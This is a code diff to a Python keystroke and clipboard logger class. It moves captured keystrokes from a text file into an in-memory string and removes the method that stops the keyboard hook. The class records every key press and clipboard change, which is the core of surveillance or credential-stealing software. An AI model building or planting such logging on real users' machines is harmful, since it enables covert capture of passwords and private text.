@@ -33,7 +33,7 @@ class KeysClipboardLogger:
         self.old_clipboard = None
         self.current_clipboard = None
         self.working_file = csv_file
-        self.current_keys_string = txt_file
+        self.current_keys_string = ''
         self.start_keylogger()
 
     def clipboard_changed(self):
@@ -53,21 +53,15 @@ class KeysClipboardLogger:
         return time.time(), data
 
     def start_keylogger(self):
-        if self.current_keys_string.closed:
-            self.current_keys_string = open("text_file.txt", "w+")
 
         def on_press(event):
-            self.current_keys_string.write(event_to_string(event))
-            self.current_keys_string.flush()
+            self.current_keys_string += event_to_string(event)
+
         kb.on_press(on_press)
 
-    def stop_keylogger(self):
-        self.current_keys_string.close()
-        kb.unhook_all()
-
     def get_current_logged_keys(self):
-        f = open("text_file.txt", "r")
-        logged_string = f.read()
+        logged_string = self.current_keys_string
+        self.current_keys_string = ''
         return logged_string
 
 
